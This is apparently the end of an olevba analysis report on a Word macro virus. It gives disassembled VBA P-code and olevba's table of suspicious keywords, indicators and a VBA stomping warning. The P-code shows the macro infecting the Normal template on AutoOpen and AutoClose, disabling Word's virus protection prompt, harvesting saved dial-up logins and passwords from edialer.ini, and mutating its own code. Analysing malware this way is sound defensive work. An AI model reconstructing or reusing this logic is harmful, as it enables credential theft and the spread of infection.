' 	St Resalt 
' Line #408:
' 	EndIfBlock 
' Line #409:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #410:
' 	EndIfBlock 
' Line #411:
' 	Loop 
' Line #412:
' 	Ld hkey 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res 
' Line #413:
' 	LitStr 0x000A "There are "
' 	Ld i 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0015 " Dial-up connections."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Resalt 
' 	Add 
' 	St Resalt 
' Line #414:
' 	Ld Resalt 
' 	St SCP 
' Line #415:
' 	EndFunc 
' Line #416:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #417:
' 	FuncDefn (Sub AutoOpen())
' Line #418:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #419:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #420:
' 	Dim 
' 	VarDefn Body (As String)
' Line #421:
' 	OnError (Resume Next) 
' Line #422:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #423:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #424:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBComponent 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #425:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0023 "Dial-up_script_and_password_checker"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #426:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #427:
' 	ExitFor 
' Line #428:
' 	EndIfBlock 
' Line #429:
' 	StartForVariable 
' 	Next 
' Line #430:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #431:
' 	Ld MacroContainer 
' 	ArgsCall CopyLines 0x0001 
' Line #432:
' 	EndIfBlock 
' Line #433:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #434:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #435:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #436:
' 	EndSub 
' Line #437:
' 	FuncDefn (Function Grab())
' Line #438:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #439:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #440:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #441:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #442:
' 	OnError (Resume Next) 
' Line #443:
' 	Ld WinDir 
' 	LitStr 0x000B "edialer.ini"
' 	Add 
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #444:
' 	Ld Friend 
' 	St NF 
' Line #445:
' 	Ld WinDir 
' 	LitStr 0x000B "edialer.ini"
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #446:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #447:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #448:
' 	LineCont 0x0008 0C 00 05 00 17 00 05 00
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000B "[RAS_Entry_"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000D "PasswordSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000A "LoginSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #449:
' 	Ld Temp 
' 	Ld Tmp 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Temp 
' Line #450:
' 	EndIfBlock 
' Line #451:
' 	Loop 
' Line #452:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #453:
' 	Ld Temp 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Conn_ 0x0000 
' 	Add 
' 	St Temp 
' Line #454:
' 	EndIfBlock 
' Line #455:
' 	Ld Temp 
' 	St Grab 
' Line #456:
' 	EndFunc 
' Line #457:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #458:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #459:
' Line #460:
' 	FuncDefn (Sub AutoClose())
' Line #461:
' 	OnError (Resume Next) 
' Line #462:
' 	ArgsCall AutoOpen 0x0000 
' Line #463:
' 	EndSub 
' Line #464:
' 	FuncDefn (Sub Sender())
' Line #465:
' 	Dim 
' 	VarDefn i (As Long)
' Line #466:
' 	LitDI2 0x0000 
' 	St i 
' Line #467:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #468:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #469:
' 	ArgsCall Sender_main 0x0000 
' Line #470:
' 	ExitSub 
' Line #471:
' 	ElseBlock 
' Line #472:
' 	LitDI2 0x00FE 
' 	ArgsCall Pause 0x0001 
' Line #473:
' 	EndIfBlock 
' Line #474:
' 	StartForVariable 
' 	Next 
' Line #475:
' 	EndSub 
' Line #476:
' 	FuncDefn (Function morf(MyString As String))
' Line #477:
' 	Dim 
' 	VarDefn NextSub (As Long)
' Line #478:
' 	Dim 
' 	VarDefn Counter (As Integer)
' Line #479:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #480:
' 	Dim 
' 	VarDefn Code_ (As String)
' Line #481:
' 	Dim 
' 	VarDefn i (As Long)
' Line #482:
' 	Dim 
' 	VarDefn Pre_ (As Long)
' Line #483:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #484:
' 	OnError (Resume Next) 
' Line #485:
' 	LitDI2 0x0001 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #486:
' 	Ld NextSub 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #487:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #488:
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #489:
' 	Loop 
' Line #490:
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim Code_ 0x0001 (As Variant)
' Line #491:
' Line #492:
' 	LitDI2 0x0008 
' 	UMi 
' 	St NextSub 
' Line #493:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #494:
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	St Pre_ 
' Line #495:
' 	Ld Pre_ 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #496:
' 	Ld MyString 
' 	Ld Pre_ 
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld Pre_ 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld i 
' 	ArgsSt Code_ 0x0001 
' Line #497:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #498:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #499:
' 	LitDI2 0x0000 
' 	ArgsLd Code_ 0x0001 
' 	St Resalt 
' Line #500:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #501:
' 	Ld Resalt 
' 	Ld i 
' 	ArgsLd A 0x0001 
' 	ArgsLd Code_ 0x0001 
' 	Add 
' 	St Resalt 
' Line #502:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #503:
' 	Ld Resalt 
' 	St morf 
' Line #504:
' 	EndFunc 
' Line #505:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #506:
' 	FuncDefn (Function WinDir())
' Line #507:
' 	Dim 
' 	VarDefn res (As Long)
' Line #508:
' 	Dim 
' 	VarDefn DirWin (As String)
' Line #509:
' Line #510:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St DirWin 
' Line #511:
' 	Ld DirWin 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St res 
' Line #512:
' 	Ld DirWin 
' 	Ld res 
' 	ArgsLd LBound 0x0002 
' 	St DirWin 
' Line #513:
' 	Ld DirWin 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St WinDir 
' Line #514:
' 	EndFunc 
' Line #515:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #516:
' Line #517:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |RasApi32.DLL        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

